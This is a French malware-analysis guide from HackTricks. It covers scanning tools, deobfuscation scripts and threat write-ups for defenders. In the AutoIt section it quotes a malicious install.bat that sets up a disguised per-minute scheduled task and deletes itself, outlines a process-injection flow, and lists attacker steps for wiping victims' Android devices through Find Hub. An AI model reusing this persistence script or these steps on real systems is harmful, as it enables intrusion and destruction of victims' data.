# Analyse de malware

{{#include ../../banners/hacktricks-training.md}}

## Fiches mémo Forensics

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Services en ligne

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Outils antivirus et de détection hors ligne

### Yara

#### Installation
```bash
sudo apt-get install -y yara
```
#### Préparez les règles

Utilisez ce script pour télécharger et fusionner toutes les règles yara malware depuis github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Créez le répertoire _**rules**_ et exécutez-le. Cela créera un fichier appelé _**malware_rules.yar**_ qui contient toutes les règles yara pour malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Analyse
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen : Vérifier la présence de malware et créer des rules

Vous pouvez utiliser l'outil [**YaraGen**](https://github.com/Neo23x0/yarGen) pour générer des yara rules à partir d'un binary. Consultez ces tutoriels : [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Installation
```
sudo apt-get install -y clamav
```
#### Analyse
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** détecte des **capabilities** potentiellement malveillantes dans les exécutables : PE, ELF, .NET. Il trouvera donc des éléments tels que Att\&ck tactics, ou des capabilities suspectes telles que :

- check for OutputDebugString error
- run as a service
- create process

Récupérez-le dans le [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC signifie Indicator Of Compromise. Un IOC est un ensemble de **conditions qui identifient** un logiciel potentiellement indésirable ou un **malware** confirmé. Les Blue Teams utilisent ce type de définition pour **rechercher ce type de fichiers malveillants** dans leurs **systèmes** et **réseaux**.  
Partager ces définitions est très utile : lorsqu'un malware est identifié sur un ordinateur et qu'un IOC pour ce malware est créé, d'autres Blue Teams peuvent l'utiliser pour identifier le malware plus rapidement.

Un outil pour créer ou modifier des IOCs est [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**  
Vous pouvez utiliser des outils tels que [**Redline**](https://www.fireeye.com/services/freeware/redline.html) pour **rechercher des IOCs définis sur un appareil**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) est un scanner pour Simple Indicators of Compromise.  
La détection est basée sur quatre méthodes de détection :
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) est un scanner de malware pour Linux publié sous la licence GNU GPLv2, conçu pour les menaces rencontrées dans les environnements d'hébergement mutualisé. Il utilise des données de menace provenant de systèmes de détection d'intrusion en bordure réseau pour extraire des malware activement utilisés dans des attaques et génère des signatures pour la détection. De plus, les données de menace proviennent aussi des soumissions d'utilisateurs via la fonctionnalité LMD checkout et des ressources communautaires sur les malware.

### rkhunter

Des outils comme [**rkhunter**](http://rkhunter.sourceforge.net) peuvent être utilisés pour vérifier le système de fichiers à la recherche de **rootkits** et de malware potentiels.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) est un outil qui essaiera de trouver des chaînes obfusquées à l'intérieur des exécutables en utilisant différentes techniques.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper)vérifie quelques éléments basiques à l'intérieur de l'exécutable (données binaires, entropie, URLs and IPs, certaines yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) est un outil qui permet d'obtenir des informations sur les exécutables Windows tels que les imports, exports, en-têtes, mais vérifie aussi virus total et trouve des techniques potentielles Att\&ck.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) est un outil pour détecter si un fichier est **encrypted** et aussi trouver des **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is un script Python qui utilise une variété de **statistical methods** pour détecter du contenu **obfuscated** et **encrypted** dans des fichiers texte/script. L'objectif visé de NeoPI est d'aider à la **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) fait de son mieux pour détecter **obfuscated**/**dodgy code** ainsi que des fichiers utilisant des fonctions **PHP** souvent utilisées dans des **malwares**/webshells.

### Apple Binary Signatures

Lorsque vous examinez un **malware sample** vous devriez toujours **check the signature** du binaire car le **developer** qui l'a signé peut déjà être **related** avec **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Techniques de détection

### File Stacking

Si vous savez qu'un dossier contenant les **files** d'un **web server** a été **mis à jour pour la dernière fois à une date donnée**. **Vérifiez** la **date** de création et de modification de tous les **files** du **web server** et si une date est **suspecte**, inspectez ce fichier.

### Baselines

Si les **files** d'un dossier **n'auraient pas dû être modifiés**, vous pouvez calculer le **hash** des **original files** du dossier et **les comparer** avec ceux **actuels**. Tout élément modifié sera **suspect**.

### Statistical Analysis

Lorsque l'information est enregistrée dans des logs, vous pouvez **vérifier des statistiques comme combien de fois chaque file d'un web server a été accédée**, car un **web shell** pourrait être parmi les plus consultés.

---

### Android in-app native telemetry (no root)

Sur Android, vous pouvez instrumenter du code natif à l'intérieur du process cible de l'app en préchargeant une petite library logger avant l'initialisation des autres libs JNI. Cela donne une visibilité précoce du comportement natif sans hooks système globaux ni root. Une approche populaire est SoTap : déposer libsotap.so pour le bon ABI dans l'APK et injecter un appel System.loadLibrary("sotap") tôt (par ex., initialiseur static ou Application.onCreate), puis récupérer les logs depuis des chemins internes/externes ou via Logcat en fallback.

Voir la page Android native reversing pour les détails de configuration et les chemins de log :

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Certain malware Android et des apps protégées par RASP cachent les noms de méthodes JNI et leurs signatures en les décodant à l'exécution avant d'appeler RegisterNatives. Lorsque l'instrumentation Frida/ptrace est tuée par l'anti-debug, vous pouvez encore récupérer le plaintext hors ligne en exécutant le décodeur contenu dans le binaire avec angr puis en poussant les résultats dans Ghidra comme commentaires.

Idée clé : traiter le décodeur à l'intérieur du .so comme une fonction appelable, l'exécuter sur les blobs d'octets obfusqués dans .rodata, et concrétiser les octets de sortie jusqu'au premier \x00 (terminateur de chaîne C). Gardez angr et Ghidra avec la même image base pour éviter les désalignements d'adresses.

Aperçu du workflow
- Triage in Ghidra : identifiez le décodeur et sa convention d'appel/arguments dans JNI_OnLoad et la configuration de RegisterNatives.
- Run angr (CPython3) pour exécuter le décodeur pour chaque chaîne cible et dumper les résultats.
- Annotate in Ghidra : commenter automatiquement les chaînes décodées à chaque lieu d'appel pour une reconstruction JNI rapide.

Ghidra triage (JNI_OnLoad pattern)
- Appliquez les JNI datatypes à JNI_OnLoad afin que Ghidra reconnaisse les structures JNINativeMethod.
- Exemple typique de JNINativeMethod selon la doc Oracle :

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Cherchez des appels à RegisterNatives. Si la librairie construit le name/signature avec une routine locale (e.g., FUN_00100e10) qui référence une table d'octets statique (e.g., DAT_00100bf4) et prend des paramètres comme (encoded_ptr, out_buf, length), c'est une cible idéale pour exécution hors ligne.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>Configuration d'angr et exécution hors ligne du décodeur</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- À grande échelle, construisez un mappage statique des sites d'appel vers les arguments du décodeur (encoded_ptr, size). Les wrappers peuvent masquer les arguments, vous pouvez donc créer ce mappage manuellement à partir des xrefs de Ghidra si la récupération des API est bruyante.

<details>
<summary>Décodage en lot de plusieurs sites d'appel avec angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Annoter les sites d'appel dans Ghidra
Option A : script Jython seul pour écrire des commentaires (utiliser un JSON pré-calculé)
- Since angr requires CPython3, gardez la déobfuscation et l'annotation séparées. Exécutez d'abord le script angr ci-dessus pour produire decoded_strings.json. Puis exécutez ce GhidraScript Jython pour écrire des PRE_COMMENTs à chaque site d'appel (et inclure le nom de la fonction appelante pour le contexte) :

<details>
<summary>Script Jython Ghidra pour annoter les chaînes JNI décodées</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B: Single CPython script via pyhidra/ghidra_bridge
- Alternativement, utilisez pyhidra ou ghidra_bridge pour piloter l'API de Ghidra depuis le même processus CPython exécutant angr. Cela permet d'appeler decode_string() et de définir immédiatement des PRE_COMMENTs sans fichier intermédiaire. La logique reflète le script Jython : construire une map callsite→function via ReferenceManager, décoder avec angr, et définir les commentaires.

Why this works and when to use it
- L'exécution hors ligne évite RASP/anti-debug : aucun ptrace, aucun hook Frida nécessaire pour récupérer les strings.
- Maintenir Ghidra et angr base_addr alignés (ex. 0x00100000) garantit que les adresses des fonctions/données correspondent entre les outils.
- Recette reproductible pour les decoders : traiter la transformation comme une fonction pure, allouer un output buffer dans un état frais, l'appeler avec (encoded_ptr, out_ptr, len), puis concretiser via state.solver.eval et parser des C-strings jusqu'à \x00.

Notes and pitfalls
- Respectez l'ABI / calling convention cible. angr.factory.callable en choisit une selon arch ; si les arguments semblent décalés, spécifiez cc explicitement.
- Si le decoder attend des buffers de sortie zéro-initialisés, initialisez outbuf avec des zéros dans le state avant l'appel.
- Pour les .so Android position-independent, fournissez toujours base_addr pour que les adresses dans angr correspondent à celles vues dans Ghidra.
- Utilisez currentProgram.getReferenceManager() pour énumérer les call-xrefs même si l'app wrappe le decoder derrière de minces stubs.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuscating Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

Les familles de malware modernes abusent massivement de l'obfuscation du Control-Flow Graph (CFG) : au lieu d'un jump/call direct elles calculent la destination à l'exécution et exécutent `jmp rax` ou `call rax`. Un petit *dispatcher* (typiquement neuf instructions) définit la cible finale selon les flags CPU `ZF`/`CF`, brisant complètement la récupération statique du CFG.

La technique — mise en avant par le loader SLOW#TEMPEST — peut être contrecarrée par un workflow en trois étapes reposant uniquement sur IDAPython et l'émulateur CPU Unicorn.

### 1. Localiser chaque jump / call indirect
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Extraire le dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Émulez-le deux fois avec Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Exécutez `run(code,0,0)` et `run(code,1,1)` pour obtenir les cibles des branches *false* et *true*.

### 4. Réappliquer le patch sur un jump / call direct
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Après patching, forcez IDA à réanalyser la fonction afin que le CFG complet et la sortie Hex-Rays soient restaurés :
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Étiqueter les appels d'API indirects

Une fois que la destination réelle de chaque `call rax` est connue, vous pouvez indiquer à IDA ce que c'est afin que les types de paramètres & les noms de variables soient récupérés automatiquement:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Avantages pratiques

* Restaure le vrai CFG → la décompilation passe de *10* lignes à des milliers.
* Permet string-cross-reference & xrefs, rendant la reconstruction du comportement triviale.
* Les scripts sont réutilisables : déposez-les dans n'importe quel loader protégé par la même astuce.

---

## Loaders basés sur AutoIt : .a3x decryption, Task Scheduler masquerade and RAT injection

This intrusion pattern chains a signed MSI, AutoIt loaders compiled to .a3x, and a Task Scheduler job masquerading as a benign app.

### MSI → custom actions → orchestrateur AutoIt

Arbre des processus et commandes exécutées par les custom actions du MSI :

- MsiExec.exe → cmd.exe pour exécuter install.bat
- WScript.exe pour afficher une boîte de dialogue d'erreur factice
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (dépose le loader, met en place la persistence, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (leurre utilisateur):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Principaux artefacts et déguisement :
- Dépose AutoIt3.exe et IoKlTr.au3 dans C:\Users\Public\Music
- Copie schtasks.exe en hwpviewer.exe (se fait passer pour le visualiseur Hangul Word Processor)
- Crée une tâche planifiée "IoKlTr" qui s'exécute toutes les 1 minute
- Raccourci de démarrage observé : Smart_Web.lnk ; mutex : `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Dépose des modules sous %APPDATA%\Google\Browser\ dans des sous-dossiers contenant `adb` ou `adv` et les démarre via autoit.vbs/install.bat

Conseils de triage forensique :
- énumération de schtasks : `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Chercher des copies renommées de schtasks.exe co-localisées avec le XML de la tâche : `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Chemins courants : `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, démarrage `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Corréler la création de processus : AutoIt3.exe lançant des binaires Windows légitimes (p. ex., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders et déchiffrement de payload .a3x → injection

- Les modules AutoIt sont compilés avec `#AutoIt3Wrapper_Outfile_type=a3x` et déchiffrent les payloads embarqués avant de les injecter dans des processus bénins.
- Familles observées : QuasarRAT (injecté dans hncfinder.exe) et RftRAT/RFTServer (injecté dans cleanmgr.exe), ainsi que des modules RemcosRAT (`Remcos\RunBinary.a3x`).
- Schéma de déchiffrement : dériver une clé AES via HMAC, déchiffrer le blob embarqué, puis injecter le module en clair.

Squelette de déchiffrement générique (l'entrée/algorithme HMAC exact est spécifique à la famille) :
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Flux d'injection courant (CreateRemoteThread-style) :
- CreateProcess (suspended) du processus cible (par ex., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory avec le module/shellcode déchiffré
- CreateRemoteThread ou QueueUserAPC pour exécuter le payload

Pistes de détection
- AutoIt3.exe ayant pour parent MsiExec.exe ou WScript.exe et lançant des utilitaires système
- Fichiers avec l'extension `.a3x` ou executeurs de scripts AutoIt situés dans des chemins publics/écrits par l'utilisateur
- Tâches planifiées suspectes exécutant AutoIt3.exe ou des binaires non signés par Microsoft, avec des déclencheurs à la minute

### Abus de prise de contrôle de compte via Android Find My Device (Find Hub)

Pendant l'intrusion Windows, les opérateurs ont utilisé des identifiants Google volés pour effacer à plusieurs reprises les appareils Android de la victime, en supprimant les notifications pendant qu'ils étendaient l'accès via le client de messagerie de bureau connecté de la victime.

Étapes de l'opérateur (depuis une session de navigateur connectée) :
- Consulter Google Account → Security → Your devices ; suivre Find My Phone → Find Hub (https://www.google.com/android/find)
- Sélectionner l'appareil → ressaisir le mot de passe Google → lancer "Erase device" (réinitialisation d'usine) ; répéter pour retarder la récupération
- Optionnel : supprimer les e-mails d'alerte dans la boîte liée (par ex., Naver) pour masquer les notifications de sécurité

## Traçage des loaders Node.js fortement obfusqués

Les attaquants empaquettent de plus en plus des loaders JavaScript à l'intérieur de binaires Windows autonomes compilés avec [`nexe`](https://github.com/nexe/nexe), de sorte que le runtime est livré avec le script. Le PE résultant pèse souvent 60–90 Mo et s'exécute même si Node.js n'est pas installé. Lors du triage :

- Utiliser [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) pour extraire le JavaScript embarqué du PE et l'alimenter dans des outils locaux pour effectuer un diff statique.
- S'attendre à un mutex basé sur le disque dans `%TEMP%` (GachiLoader dépose un fichier aléatoire `<name>.lock` qui expire après ~5 minutes). Copier le fichier dans le sandbox avant l'exécution permet de sauter des étapes redondantes tout en observant les payloads ultérieurs.

### Traçage des API Node.js pour contourner l'anti-analyse

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) hooke les modules core dans n'importe quel processus Node.js, permet de falsifier les sondes anti-VM, et préserve chaque artefact écrit par l'échantillon. Lancez des scripts obfusqués via le tracer pour conserver l'instrumentation contrôlée par l'analyste dans la pile d'appels :
```powershell
node -r .\tracer.js main.js
```
Les bascules de configuration clés dans `tracer.js` vous permettent de :

- Journaliser l'activité du filesystem, des child-process et HTTP (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Chaque fichier déposé — tel que `kidkadi.node` — est copié dans le répertoire de travail avant que le malware ne le supprime.
- Surcharger les empreintes d'environnement en renvoyant des nombres réalistes de RAM/CPU, en falsifiant la sortie de `tasklist` et en altérant les réponses PowerShell/WMI. Cela contourne les loaders qui exigent ≥4 GB RAM, ≥2 cores, et qui scrutent les noms d'utilisateur (`mashinesssss`, `wdagutilityaccount`, etc.), les hostnames (`desktop-vrsqlag`, `server1` …) et les noms de processus (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`).
- Neutraliser les vérifications matérielles WMI comme `Get-WmiObject Win32_DiskDrive` (cherchant `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (bloquant « VirtualBox Graphics Adapter », « Hyper-V Video », etc.) et le comptage `Win32_PortConnector`. Quand ces sondes rapportent du matériel “réel”, les sandboxes n'entrent plus dans la boucle infinie d'appels bénins `Invoke-WebRequest` vers `linkedin.com`, `grok.com`, `whatsapp.com` et des domaines similaires que GachiLoader utilise pour faire perdre du temps d'analyse.

### Capture automatique du trafic C2 restreint

Les hooks réseau du tracer révèlent une authentification C2 multi-couche sans avoir à inverser l'obfuscation JavaScript. Dans la campagne observée le loader :

1. Envoie en POST la télémétrie de l'hôte à `/log` sur chaque C2 codé en dur.
2. Effectue un `GET /richfamily/<per-sample key>` avec `X-Secret: gachifamily` pour récupérer une URL de payload encodée en Base64.
3. Effectue un `GET` final vers cette URL avec un long en-tête `X-Secret` propre à l'échantillon ; si cet en-tête manque, la réponse est `403 Forbidden`.

Comme le tracer enregistre les requêtes complètes (en-têtes, corps, destinations), vous pouvez rejouer le même trafic pour récupérer les payloads, dumper les shells Themida/VMProtect en mémoire et extraire les données de configuration Rhadamanthys à grande échelle.

## AdaptixC2: Configuration Extraction and TTPs

Voir la page dédiée :

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
